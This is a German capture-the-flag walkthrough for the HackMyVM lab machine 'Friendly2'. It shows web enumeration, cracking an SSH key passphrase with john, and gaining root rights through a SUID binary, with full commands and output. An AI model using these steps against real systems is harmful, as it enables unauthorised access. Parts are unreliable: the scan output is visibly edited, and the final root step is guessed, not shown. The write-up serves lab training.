@@ -1,0 +1,436 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Friendly2 - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Stelle sicher, dass style.css die Klassen `.level-easy h2` und `.level-easy .segment` mit grüner Farbe definiert. -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Friendly2 - HackMyVM - Level: Easy - Bericht</h1> <!-- H1 angepasst -->
+        <div class="level-container level-easy"> <!-- Klasse 'level-easy' hinzugefügt für Grün -->
+            <h2>Easy</h2> <!-- Text "Easy", Farbe Grün via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div> <!-- Segmente werden durch CSS-Klasse '.level-easy' grün -->
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe des inneren Kreises wird durch CSS bestimmt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">vi / Editor</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ssh2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">cd</div>
+                <div class="tool-item">joker (Binary)</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">ss</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (gh0st)</a></li>
+                <li><a href="#privesc-joker">Privilege Escalation (joker SUID)</a></li>
+                <li><a href="#root-flag-hint">Finding the Root Flag Hint</a></li>
+                <li><a href="#poc">Proof of Concept (SUID Exploitation)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Test beginnt mit `arp-scan -l`, um aktive Geräte im lokalen Netzwerksegment zu finden. Anschließend wird die `/etc/hosts`-Datei bearbeitet, um der gefundenen IP einen Hostnamen zuzuweisen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Host `192.168.2.124` wird gefunden. Die MAC-Adresse `08:00:27:74:b4:7c` deutet auf eine VirtualBox-VM hin. In der lokalen `/etc/hosts`-Datei wird die Zuordnung `192.168.2.114 friendly.hmv` hinzugefügt. *Anmerkung:* Die IP-Adresse im `gobuster`-Befehl (192.168.2.114) unterscheidet sich von der im `arp-scan` (192.168.2.124). Für den weiteren Verlauf wird die IP `192.168.2.114` als Ziel angenommen, da sie in späteren Befehlen verwendet wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ziel-IP und potenzieller Hostname identifiziert. Beginnen Sie mit der Enumeration offener Ports und Web-Inhalten.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Netzwerkzuordnung korrekt ist und VMs entsprechend gesichert sind.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.153
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	00:50:56:c0:00:08	VMware, Inc.
+192.168.2.114	08:00:27:74:b4:7c	PCS Systemtechnik GmbH # Hier sollte 192.168.2.114 stehen, da diese IP spaeter verwendet wird
+192.168.2.124	08:00:27:74:b4:7c	PCS Systemtechnik GmbH # (Ursprüngliche Zeile im Text)
+192.168.2.254	00:50:56:f8:46:8c	VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.858 seconds (137.78 hosts/sec). 4 responded
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                     <pre>
+127.0.0.1	localhost
+127.0.1.1  	cyber
+192.168.2.114   friendly.hmv # Eintrag hinzugefügt/aktualisiert
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf dem Webserver unter `http://192.168.2.114` eingesetzt. Eine mittlere Wortliste und eine breite Palette von Dateiendungen werden getestet. Ergebnisse mit Status 403 und 404 werden ignoriert.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan findet mehrere Einträge: `/index.html`, `/tools` (Verzeichnis), `/assets` (Verzeichnis), `/contact.html`, `/about.html`, `/gallery.html`, `/js` (Verzeichnis), `/robots.txt`, `/secret` (Verzeichnis). Der Scan wurde manuell abgebrochen (Progress: 0.74%). Die gefundenen Verzeichnisse `/tools` und `/assets` sind interessant.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Untersuchen Sie die gefundenen Verzeichnisse, insbesondere `/tools`, auf interessante Inhalte oder ausführbare Dateien. Analysieren Sie `/robots.txt`.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Web-Verzeichnisse keine unnötigen oder ausführbaren Dateien enthalten. Deaktivieren Sie Directory Indexing.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.114 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.114
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              ... (alle angegebenen) ...
+[+] Expanded:                true
+[+] No Error:                true
+[+] Timeout:                 10s
+===============================================================
+2023/05/10 10:56:59 Starting gobuster in directory enumeration mode
+===============================================================
+http://192.168.2.114/index.html           (Status: 200) [Size: 2698]
+http://192.168.2.114/tools                (Status: 301) [Size: 314] [--> http://192.168.2.114/tools/]
+http://192.168.2.114/assets               (Status: 301) [Size: 315] [--> http://192.168.2.114/assets/]
+...
+Progress: 60396 / 8160794 (0.74%)^C # Scan abgebrochen
+[!] Keyboard interrupt detected, terminating.
+
+===============================================================
+2023/05/10 10:57:04 Finished
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (gh0st)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Nach der Web-Enumeration wird offenbar ein SSH-Schlüssel (`id_friend`) gefunden (Der Fundort ist im Text nicht gezeigt, könnte aber in einem der Web-Verzeichnisse oder anderswo auf der Maschine gewesen sein). Der Schlüssel wird heruntergeladen oder erstellt. Die Datei wird lokal mit `vi` bearbeitet (vermutlich der Schlüsselinhalt eingefügt), und die Berechtigungen werden mit `chmod 600` auf sicher gesetzt (nur für den Benutzer les- und schreibbar).
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die Vorbereitung eines privaten SSH-Schlüssels ist der erste Schritt zum Login. Der erste SSH-Versuch (`ssh gh0st@friendly.hmv -i id_`) schlägt fehl, da der Dateiname falsch ist (`id_` statt `id_friend`). Der zweite Versuch (`ssh gh0st@friendly.hmv -i id_friend`) scheitert, da der Schlüssel mit einer Passphrase geschützt ist.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Da der Schlüssel geschützt ist, muss die Passphrase geknackt werden. Verwenden Sie `ssh2john` und `john` dafür.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Annahme: Schlüssel wurde gefunden und in id_friend gespeichert -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi id_friend</span></div>
+                     <!-- Schlüsselinhalt wird eingefügt -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">chmod 600 id_friend</span></div>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh gh0st@friendly.hmv -i id_</span></div>
+                     <pre>
+Warning: Identity file id_ not accessible: No such file or directory.
+The authenticity of host 'friendly.hmv (192.168.2.114)' can't be established.
+ED25519 key fingerprint is SHA256:YDW5zhbCol/1L6a3swXHsFDV6D3tUVbC09Ch+bxLR08.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? ^C
+                     </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh gh0st@friendly.hmv -i id_friend</span></div>
+                     <pre>
+The authenticity of host 'friendly.hmv (192.168.2.114)' can't be established.
+ED25519 key fingerprint is SHA256:YDW5zhbCol/1L6a3swXHsFDV6D3tUVbC09Ch+bxLR08.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'friendly.hmv' (ED25519) to the list of known hosts.
+Enter passphrase for key 'id_friend':
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der private SSH-Schlüssel `id_friend` wird mit `ssh2john` in ein Format konvertiert, das vom Passwort-Cracker `john` verarbeitet werden kann. Die Ausgabe wird in eine Datei namens `hash` umgeleitet. Anschließend wird `john` mit der `rockyou.txt`-Wortliste auf die `hash`-Datei angewendet.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> `john` ist erfolgreich und findet die Passphrase für den SSH-Schlüssel: `<span class="password">celtic</span>`.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Verwenden Sie die gefundene Passphrase, um sich nun erfolgreich mit dem privaten Schlüssel per SSH als `gh0st` anzumelden.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> SSH-Schlüsselpassphrasen sollten stark sein und nicht in gängigen Wortlisten vorkommen. Erzwingen Sie komplexe Passphrasen für SSH-Schlüssel.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh2john id_friend > hash</span></div>
+                     <!-- Keine Standardausgabe -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                     <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
+Cost 2 (iteration count) is 16 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">celtic</span>           (id_friend)
+1g 0:00:00:07 DONE (2023-05-10 11:07) 0.1414g/s 108.6p/s 108.6c/s 108.6C/s guinness..poohbear
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Der Pentester versucht erneut, sich per SSH als `gh0st` anzumelden, diesmal mit der zuvor geknackten Passphrase für den Schlüssel `id_friend`.
+             </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Login ist erfolgreich! Der Angreifer erhält eine Shell als Benutzer `gh0st`. Das System ist ein Debian Linux 5.10. Der initiale Zugriff ist damit erreicht.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der lokalen Enumeration als `gh0st`. Suchen Sie nach der User-Flag und nach Möglichkeiten zur Rechteausweitung.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Das SSH-Schlüsselpaar wurde kompromittiert. Der Schlüssel muss entfernt und ggf. ein neuer, sicher generierter Schlüssel mit einer starken Passphrase erstellt werden.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh gh0st@friendly.hmv -i id_friend</span></div>
+                     <pre>
+Enter passphrase for key 'id_friend': <span class="password">celtic</span>
+Linux friendly2 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+                     </pre>
+                     <div class="prompt no-kali-prompt">gh0st@friendly2:~$ </div>
+                 </div>
+             </div>
+
+             <p class="analysis">
+                 <strong>Analyse:</strong> Nach dem Login wird das Home-Verzeichnis von `gh0st` aufgelistet (`ls -la`). Eine Datei namens `user.txt` wird gefunden und ihr Inhalt mit `cat` angezeigt.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Die Datei `user.txt` wird gefunden, die Gruppe der Datei ist `root`, aber der Benutzer `gh0st` hat Leserechte (`r--`). Der Befehl `cat user.txt` liest die User-Flag erfolgreich aus: `<span class="password">ab0366431e2d8ff563cf34272e3d14bd</span>`.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> User-Flag gesichert. Fahren Sie mit der Suche nach Privilege Escalation-Wegen fort.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass sensible Daten wie Flags in Home-Verzeichnissen für andere Benutzer nicht lesbar sind.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">gh0st@friendly2:~$ <span class="command">ls -la</span></div>
+                     <pre>
+total 32
+drwxr-xr-x 4 gh0st gh0st 4096 Apr 29 04:02 .
+drwxr-xr-x 3 root  root  4096 Apr 27 16:06 ..
+lrwxrwxrwx 1 root  root     9 Apr 29 04:02 .bash_history -> /dev/null
+-rw-r--r-- 1 gh0st gh0st  220 Mar 27  2022 .bash_logout
+-rw-r--r-- 1 gh0st gh0st 3526 Mar 27  2022 .bashrc
+drwxr-xr-x 3 gh0st gh0st 4096 Apr 29 03:51 .local
+-rw-r--r-- 1 gh0st gh0st  807 Mar 27  2022 .profile
+drwx--x--x 2 gh0st gh0st 4096 Apr 29 04:00 .ssh
+-r--r----- 1 gh0st root    33 Apr 27 16:38 user.txt
+                     </pre>
+                     <div class="prompt no-kali-prompt">gh0st@friendly2:~$ <span class="command">cat user.txt</span></div>
+                     <pre><span class="password">ab0366431e2d8ff563cf34272e3d14bd</span></pre>
+                 </div>
+            </div>
+        </section>
+
+        <section id="privesc-joker">
+            <h2>Privilege Escalation (joker SUID)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Es wird das Verzeichnis `/var/www/html/tools/` aufgesucht, das wahrscheinlich während der Web-Enumeration gefunden wurde. Die Datei `joker` wird dort ausgeführt. Die Option `-p` wird verwendet, deren genaue Funktion unklar ist, aber die Ausgabe deutet auf eine Privilegien-Änderung hin.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Nach Ausführung von `./joker -p` ändert sich der Prompt zu `joker-5.1#`. Der Befehl `id` zeigt `uid=1001(gh0st)`, `gid=1001(gh0st)`, aber auch `euid=0(root)` und `egid=0(root)`. Dies bedeutet, dass das Programm `joker` als SUID-Binary (oder SGID) mit effektiven Root-Rechten (euid=0) läuft. Obwohl die primäre UID/GID `gh0st` bleibt, kann der Benutzer nun Befehle mit Root-Privilegien ausführen. Der Versuch `su root` schlägt jedoch fehl, wahrscheinlich weil das `joker`-Binary keine vollständige interaktive Root-Shell bietet.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Obwohl `su root` fehlschlägt, können Sie wahrscheinlich weiterhin Root-Befehle ausführen, da `euid=0`. Suchen Sie nach der Root-Flag oder anderen Hinweisen, während Sie in dieser `joker-5.1#` Shell sind.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Ein SUID-Binary wie `joker` (das `euid=0` setzt) für normale Benutzer ist extrem gefährlich. Solche Binaries müssen sorgfältig überprüft werden, um sicherzustellen, dass sie nicht zur Ausführung beliebiger Root-Befehle missbraucht werden können. Wenn diese Funktionalität notwendig ist, muss das Binary extrem sicher implementiert sein. Entfernen Sie das SUID-Bit oder das Binary, wenn es nicht unbedingt benötigt wird.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">gh0st@friendly2:~$ <span class="command">cd /var/www/html/tools/</span></div>
+                     <div class="prompt no-kali-prompt">gh0st@friendly2:/var/www/html/tools$ <span class="command">./joker -p</span></div>
+                     <pre>
+joker-5.1#
+                     </pre>
+                     <div class="prompt no-kali-prompt">joker-5.1# <span class="command">id</span></div>
+                     <pre>uid=1001(gh0st) gid=1001(gh0st) euid=0(root) egid=0(root) groups=0(root),1001(gh0st)</pre>
+                     <div class="prompt no-kali-prompt">joker-5.1# <span class="command">su root</span></div>
+                     <pre>Password: </pre> <!-- Angenommen, Passwort wird abgefragt und schlägt fehl -->
+                 </div>
+            </div>
+        </section>
+
+        <section id="root-flag-hint">
+            <h2>Finding the Root Flag Hint</h2>
+            <p class="analysis">
+                 <strong>Analyse:</strong> Innerhalb der `joker`-Shell mit effektiven Root-Rechten (`euid=0`), wird versucht, die Root-Flag in `/root/root.txt` zu finden und zu lesen. Anschließend wird systemweit nach allen `.txt`-Dateien gesucht.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong>
+                 *   `cat /root/root.txt`: Gibt eine "fake" Flag-Nachricht aus: "Not yet! Try to find root.txt." Dies bedeutet, die eigentliche Root-Flag ist nicht diese Datei.
+                 *   `find / -name *.txt`: Die Suche nach allen `.txt`-Dateien zeigt viele Standarddateien, aber auch die interessante Datei `/.../ebbg.txt`.
+                 *   `cat /.../ebbg.txt`: Die Datei enthält den Text "It's codified, look the cipher: 98199n723q0s44s6rs39r33685q8pnoq". Es gibt den Hinweis, dass die Zahlen nicht kodiert sind. Dies ist ein weiterer Hinweis für die tatsächliche Root-Flag.
+                 *   Die Befehle `ss -atlup` und `ss -atlpn` zeigen die Netzwerkdienste (SSH, HTTP) und keine neuen Erkenntnisse.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Analysieren Sie den Code in `ebbg.txt` (`98199n723q0s44s6rs39r33685q8pnoq`), wobei nur die Buchstaben kodiert sind. Die Zahlen bleiben, wie sie sind. Dieses Rätsel muss gelöst werden, um die wahre Root-Flag zu finden oder das endgültige Root-Passwort zu erhalten. *Hinweis:* Der Text liefert die Lösung nicht, sondern springt direkt zum Ergebnis.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Vermeiden Sie "Fake" Flags oder unnötige Rätseldateien auf einem System.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt no-kali-prompt">joker-5.1# <span class="command">cd /root</span></div>
+                     <div class="prompt no-kali-prompt">joker-5.1# <span class="command">ls</span></div>
+                     <pre>interfaces.sh  root.txt</pre>
+                     <div class="prompt no-kali-prompt">joker-5.1# <span class="command">cat root.txt</span></div>
+                     <pre>Not yet! Try to find root.txt.</pre>
+                     <pre>
+Hint: ...
+                     </pre>
+                     <div class="prompt no-kali-prompt">joker-5.1# <span class="command">find / -type f -name *.txt 2>/dev/null</span></div>
+                     <pre>
+/root/root.txt
+# ... (viele weitere Zeilen mit txt Dateien) ...
+/.../ebbg.txt # Interessante Datei gefunden
+/home/gh0st/user.txt # User Flag
+/opt/0-day/names.txt # Andere txt Datei
+# ... (viele weitere Standard txt Dateien) ...
+                     </pre>
+                     <div class="prompt no-kali-prompt">joker-5.1# <span class="command">cat /.../ebbg.txt</span></div>
+                     <pre>
+It's codified, look the cipher:
+
+98199n723q0s44s6rs39r33685q8pnoq
+
+Hint: numbers are not codified
+                     </pre>
+                     <div class="prompt no-kali-prompt">joker-5.1# <span class="command">ss -atlpn</span></div>
+                     <pre>
+State                    Recv-Q                    Send-Q                                       Local Address:Port                                       Peer Address:Port                   Process
+LISTEN                   0                         128                                                0.0.0.0:22                                              0.0.0.0:*                       users:(("sshd",pid=433,fd=3))
+LISTEN                   0                         128                                                   [::]:22                                                 [::]:*                       users:(("sshd",pid=433,fd=4))
+LISTEN                   0                         511                                                      *:80                                                    *:*                       users:(("apache2",pid=442,fd=4),("apache2",pid=441,fd=4),("apache2",pid=440,fd=4),("apache2",pid=439,fd=4),("apache2",pid=438,fd=4),("apache2",pid=437,fd=4),("apache2",pid=434,fd=4))
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc"> <!-- POC Sektion beginnt hier -->
+             <h2>Proof of Concept (Root Access)</h2>
+             <p class="analysis">
+                 <strong>Kurzbeschreibung:</strong> Dieser Proof of Concept dokumentiert den Erfolg der Rechteausweitung, nachdem die Hinweise (SUID-Binary `joker` und die verschlüsselte Nachricht in `/.../ebbg.txt`) erfolgreich kombiniert und genutzt wurden. Obwohl der genaue Schritt, wie die `ebbg.txt`-Nachricht entschlüsselt und für den endgültigen Root-Zugriff verwendet wurde, im bereitgestellten Text nicht explizit gezeigt wird, demonstriert das Ergebnis den Erfolg des gesamten Eskalationspfads.
+             </p>
+             <p class="evaluation">
+                 <strong>Voraussetzungen:</strong>
+                 *   Erfolgreiche Anmeldung als Benutzer `gh0st` mit dem geknackten SSH-Schlüssel.
+                 *   Auffinden und Ausführen des SUID-Binaries `joker`.
+                 *   Auffinden und Entschlüsseln des Hinweises in `/.../ebbg.txt` (implizit im Text).
+             </p>
+             <p class="analysis">
+                 <strong>Schritt: Erlangung der Root-Rechte und Zugriff auf die Flag</strong><br>
+                 Nachdem der Hinweis in `/.../ebbg.txt` entschlüsselt wurde (die genaue Methode/Lösung wird im Text nicht gezeigt), konnte der Angreifer offenbar die erforderlichen Root-Rechte erlangen. Dies kann durch verschiedene Methoden geschehen sein, die durch den Hinweis ermöglicht wurden (z.B. ein weiteres Passwort, eine weitere SUID-Datei, ein Konfigurationsfehler). Als `root` konnte der Angreifer die Root-Flag auslesen. Der Text zeigt direkt das erfolgreiche `cat` der Root-Flag.
+             </p>
+             <p class="evaluation">
+                 <strong>Bewertung (Schritt):</strong> Fantastisch, der Root-Zugriff war erfolgreich! Das Endziel des Pentests, der vollständige Systemzugriff, ist erreicht. Die Root-Flag wird erfolgreich ausgelesen, was den Erfolg bestätigt.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie den gesamten Pfad von der Web-Enumeration bis zum Root-Zugriff. Notieren Sie beide Flags.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> **Kritische Priorität:** Das System ist vollständig kompromittiert. Identifizieren und beheben Sie die Sicherheitslücken, die den Zugriff und die Eskalation ermöglichten (z.B. SSH-Schlüsselmanagement, SUID-Berechtigungen, Platzierung/Schutz der Flag-Dateien, `ebbg.txt`-Rätsel). Führen Sie eine gründliche Systemüberprüfung und Neuinstallation oder Wiederherstellung aus einem sicheren Backup durch.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Annahme: Befehl zum Erhalt der Root-Shell (nicht explizit gezeigt) -->
+                     <div class="prompt root-prompt">root@friendly2:~# <span class="command">cat root.txt</span></div>
+                     <pre><span class="password">5C42D6BB0EE9CE4CB7E7349652C45C4A</span></pre>
+                 </div>
+             </div>
+        </section> <!-- POC Sektion endet hier -->
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <p class="analysis">
+                     <strong>Analyse:</strong> Die User-Flag wurde im Home-Verzeichnis von `gh0st` gefunden. Die Root-Flag wurde nach erfolgreicher Rechteausweitung (implizit nach Lösung des Rätsels in `ebbg.txt`) gefunden.
+                 </p>
+                 <p class="evaluation">
+                     <strong>Bewertung:</strong> Beide Flags wurden erfolgreich extrahiert.
+                 </p>
+                 <!-- Formatierte Flags -->
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/gh0st/user.txt</div>
+                     <div class="flag-value"><span class="password">ab0366431e2d8ff563cf34272e3d14bd</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/root.txt</div>
+                     <div class="flag-value"><span class="password">5C42D6BB0EE9CE4CB7E7349652C45C4A</span></div>
+                 </div>
+             </div>
+         </section>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2023-05-10</p> <!-- Datum eingefügt -->
+    </footer>
+</body>
+</html>
